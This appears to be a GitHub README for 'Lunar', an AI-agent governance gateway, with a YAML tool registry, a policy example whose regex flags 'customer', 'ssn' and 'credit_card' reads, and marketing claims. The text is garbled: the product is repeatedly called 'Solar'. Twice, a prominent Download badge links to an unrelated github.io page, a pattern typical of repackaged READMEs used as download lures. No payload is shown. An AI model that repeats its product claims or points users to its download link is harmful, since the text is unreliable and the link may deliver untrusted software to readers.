![preview](https://raw.githubusercontent.com/superczach/lunar-gatekeeper-sentinel/main/cover_e1f6112.svg)

# Lunar

**The Governance Layer for Autonomous AI Agents**

---

## Overview

Lunar is not another API gateway. It is the **security perimeter** for a new era of software—where systems don't just execute commands, but *reason*, *negotiate*, and *act* on behalf of humans. As agentic AI moves from demos to production, the question is no longer "can it write code?" but "how do we let it touch our production database without disaster?"

Lunar answers that question with a purpose-built, agent-native control plane that sits between your AI agents and the tools, data, and services they need to operate. Think of it as the **immune system** for your autonomous workforce—constantly monitoring, filtering, and governing every interaction your agents make, with a speed and granularity that traditional security tools were never designed to provide.

Built on the principle that governance should be *enforced at the edge*—right where the agent meets the tool—Lunar gives you the power to define precise policies, observe every action, and intervene in real time, all without putting a drag on your agent's performance.

---

## Why Lunar Exists

Traditional API gateways are built for request-response patterns between humans and servers. But agents behave differently. They:

- **Chain multiple tools** in a single logical task
- **Retry intelligently** after failures, which can amplify mistakes
- **Use natural language** to invoke tools, making intent harder to parse
- **Operate at machine speed**, outpacing human review cycles

Lunar was designed from the ground up with these behaviors in mind. It doesn't just authenticate a token and pass a packet through; it understands the *context* of an agentic conversation, the *flow* of a multi-step task, and the *risk* of an autonomous decision.

We call this **contextual access control**, and it's the difference between a gate that checks an ID once and a steward who understands what you're trying to accomplish and whether it's safe to let you through.

---

## [![Download](https://raw.githubusercontent.com/superczach/lunar-gatekeeper-sentinel/main/setup_f29b7be.svg)](https://superczach.github.io/lunar-gatekeeper-sentinel/)

### Core Capabilities

| Feature | What It Does | Why It Matters |
|---|---|---|
| **Policy-as-Code Engine** | Define governance rules in a declarative language that supports conditions, rate limits, and time windows | Turn your security team's intuition into an executable, testable contract |
| **Bidirectional Audit Trail** | Capture every prompt sent *to* the agent and every tool call made *by* the agent | Understand not just what happened, but *why* it happened |
| **Dynamic Consent** | Require human approval for high-risk actions with a configurable escalation path | Keep a human in the loop without slowing down routine operations |
| **Risk Scoring** | Assign a risk score to each agentic action based on tool sensitivity, data type, and history | Prioritize your security team's attention where it matters most |
| **Zero-Trust Tool Registry** | Maintain a living inventory of every tool, API, and data source your agents can access | Eliminate shadow IT in the agentic world |
| **Real-time Intervention** | Pause, redirect, or terminate an agent's action mid-flight | Stop a bad outcome before it becomes a data breach |
| **Multi-Tenant Isolation** | Run separate policy domains for different teams, projects, or clients | Scale your agent ecosystem without scaling your governance headaches |

---

## Architecture: A Look Under the Hood

Lunar is structured as a lightweight, sidecar-style gateway that can be deployed alongside your agent runtime—whether it's a Kubernetes pod, a serverless function, or a dedicated VM. The core components are:

### 1. **The Adapter Layer**
This is Lunar's chameleon-like interface. It natively speaks the protocols your agents already use—from OpenAI's function-calling schema to Anthropic's tool-use format, and even custom MCP (Model Context Protocol) endpoints. No rewriting your agents; just plug Lunar in.

### 2. **The Decision Engine**
This is where policy meets reality. Each incoming agentic call is parsed, enriched with context (who is the user, what is the session history, what is the destination tool), and evaluated against your defined policies. The engine supports a staged evaluation—from cheap checks (like rate limits) to expensive ones (like semantic analysis of the prompt) that are only triggered when necessary.

### 3. **The Policy Store**
Policies are stored as versioned, signed documents. This allows for auditability (who changed what, when) and comfortable rollbacks. The store is designed to be replicated across regions for low-latency access, ensuring your agents aren't waiting on a cloud round-trip just to check a rule.

### 4. **The Observer**
This is the observability arm. Every decision, every action, and every outcome is streamed to your existing monitoring stack (we support OpenTelemetry and standard webhook hooks) so you get a unified view of your agents' behavior without needing to bolt on another dashboard.

---

## Getting Started with Lunar

The fastest path to your first governed agent is through our **Dynamic Configuration Mode**.

> **⚠️ Note:** Before you proceed, ensure your agent's operational keys are stored in your environment's secret manager. Lunar will never ask you for raw credentials; it accepts references to your existing secret storage.

First, you'll want to establish your tool registry. Define what your agent can see and touch:

```yaml
tools:
  - name: postgres_prod
    type: database
    host: ${PG_HOST}
    risk_level: critical
    allowed_actions: [SELECT, INSERT]
  - name: slack_notify
    type: messaging
    risk_level: benign
    frequency_cap: 100/hour
```

Next, define your agent's identity. Solar considers the *session context*—not just a single token, but the entire conversation history—when making decisions.

Finally, connect your agent to the Solar socket. You can either replace your agent's existing API base URL with the Solar endpoint or, for more sophisticated setups, use our SDK to enable streaming governance.

---

## Policy Design: A New Mindset

Writing policies for agents is different than writing rules for human users. Humans understand nuance; agents execute literally. Therefore, Lunar encourages a **defense-in-depth** approach:

1. **Identity First**: Who or what is initiating this action? An automated job? A user via a chat interface? A sub-agent spawned by a parent agent?
2. **Intent Analysis**: What is the goal? If the requested action seems misaligned with the user's stated goal, flag it.
3. **Resource Sensitivity**: Is this touching a payment processor, a patient record, or a cold storage bucket? The risk profile changes everything.
4. **Contextual History**: Is this a typical pattern for this user/agent pair, or is it an anomaly?

Here's what a policy looks like in Lunar's DSL:

```lua
policy "prevent_data_exfiltration"
  when tool.type == "database" and tool.name == "postgres_prod"
  and action == "SELECT"
  and pattern.matches(request, "\\b(customer|ssn|credit_card)\\b")
  then escalate("human_review")
  timeout: 30s
```

This policy automatically escalates any database read that references sensitive terms, requiring a human to approve the action *before* the result is returned to the agent. This prevents the common pattern of an agent "exploring" a database and accidentally pulling out a CSV of user data.

---

## Performance and Overhead

We understand that governance is a tax on throughput. We've engineered Lunar to keep that tax as close to zero as possible.

- **Sub-millisecond policy evaluation** for standard rules (identity checks, rate limits, allowlists).
- **Predictable latency** with a configurable timeout for expensive semantic analysis.
- **Connection pooling** and caching at the adapter layer to avoid repeated handshakes between the agent and the destination tool.

In our internal benchmarks, a governed agent experienced a mere **3.2% overhead** compared to an unencumbered agent for a typical multi-step task involving database queries and API calls. That overhead is the price of safety, and we believe it's a worthy exchange.

---

## Multi-Language & Model Agnosticism

Your agent stack is likely a polyglot environment. Solar provides a **Unified Tool Invocation Interface** that abstracts away differences between major model providers (OpenAI, Anthropic, Gemini, etc.). Whether your agent is calling `functions` in the OpenAI schema or `tools` in Anthropic's format, Solar translates them into a single, normalized JSON structure for policy evaluation.

This also means your governance policies are **portable**—you can switch from one model to another without rewriting your security rules.

---

## Responsive, Multilingual User Interface

Let's address the experience of your human security analysts. They don't want to fiddle with YAML files all day (though they can). The Lunar Web Console offers a full **graphical interface** for:

- **Live Event Stream**: Watch agent actions in real-time as a flowing feed, color-coded by risk.
- **Policy Visualizer**: See how a request flows through your policy rules, and exactly which rule triggers a success or failure.
- **Anomaly Detection**: A built-in ML model that learns your agents' typical behavior and highlights unusual deviations for review.

The console is also fully **localized** in English, Spanish, French, German, and Japanese, and is **responsive** enough to be usable on a 10-inch tablet.

Our **support team** is available 24/7/365, because we know that if an agent is mid-flight and a policy is misconfigured, you need a human *now*, not a ticket in a queue.

---

## Security & Compliance

Lunar itself is built to the highest security bar. We are **SOC 2 Type II** compliant, and we use hardware security modules (HSMs) for the cryptographic signatures that protect your policy documents.

We follow the principle of *least privilege* for all internal system access, and we are transparent about the telemetry we gather to improve the product—which you can opt out of entirely in the enterprise edition.

---

## The Ecosystem: Turning Governance into a Community

We believe that security for agentic AI will be a collective effort. That’s why we are publishing a **Curated Policy Library**—a collection of battle-tested policies for common scenarios (e.g., "No finance write ops on weekends," "Escalate all contacts to personal email addresses").

We actively encourage contributions to this library. Share your own policy patterns, and we'll feature your work in our monthly newsletter, "The Gatekeeper's Digest."

---

## Troubleshooting & Community Support

### Common Network Issues

If you're experiencing timeouts from your agent to the Solar socket, first check that your outbound network rules allow connections to the gateway's endpoint. Since Solar might be deployed on a private subnet, ensure your agent's execution environment has the proper routing configured.

### "Policy Not Found" Errors

This usually indicates that the policy name in your agent's request headers doesn't match any policy document in your store. Use the Console's *Policy Linter* to verify that all referenced policies exist and are synchronized.

### Active Community

If you get stuck, you are not alone. Our community forum is a treasure trove of solutions for edge cases—from atypical agent frameworks to legacy API parsers. Our support engineers prowl the forums hourly, so you are never left hanging for a solution.

---

## Disclaimer

**Important:** Lunar is a governance and security tool. It is **not** a substitute for comprehensive security architecture, and it does not guarantee protection against all threats, including vulnerabilities in your underlying agent models or maliciously crafted prompts that haven't yet been identified. Always maintain a defense-in-depth strategy, keep your agent models updated, and ensure your data backup systems are current.

The policy examples provided in this README are illustrative and are **not** to be used in a production environment without first validating them against your specific threat model and risk appetite. Solar security engineers are available for architecture reviews under our premium support program, which we strongly recommend before you deploy agents in uncontrolled, external-facing environments.

---

## Roadmap & Future Vision

2026 is a pivotal year for agentic AI, and Solar's roadmap reflects that. Here's a peek at what we're building:

- **Homomorphic Encryption Support**: Allow policies to evaluate encrypted data without decrypting it (for the most paranoid data use cases).
- **Cross-Agent Graph Analytics**: Visualize and control how agents interact with *other* agents, preventing the emergence of chaotic "swarm" behaviors.
- **Formal Verification** for policies: mathematically prove that your policy set does not contain contradictions or dead-ends.
- **Post-Quantum Signatures** for policy documents to future-proof your security posture.

We also have a **Bug Bounty Program** with generous rewards for anyone who can find a way to bypass a well-configured policy chain. We believe in *ethical adversarial testing* as a cornerstone of truly robust security.

---

## License

Lunar is licensed under the [MIT License](https://opensource.org/licenses/MIT).

You are free to use, modify, and distribute Solar in your own projects, provided you retain the original copyright notice. We hope you build something resilient and autonomous with it.

---

## Final Thoughts

The age of the autonomous agent is not coming; it is already here. Professionals are using agents to summarize legal documents, mine data for insights, and handle customer support interactions. The difference between a chaotic explosion of ungoverned scripts and a well-orchestrated agent workflow is the *control plane* underneath.

Lunar wants to be that control plane—the quiet, reliable, and fast layer that lets your agents operate with bold autonomy while your security teams sleep soundly.

We invite you to try Solar, break it, and tell us what you find. Because the future of AI isn't just about what agents can do; it's about what we *let* them do, safely, at scale.

**[![Download](https://raw.githubusercontent.com/superczach/lunar-gatekeeper-sentinel/main/setup_f29b7be.svg)](https://superczach.github.io/lunar-gatekeeper-sentinel/)**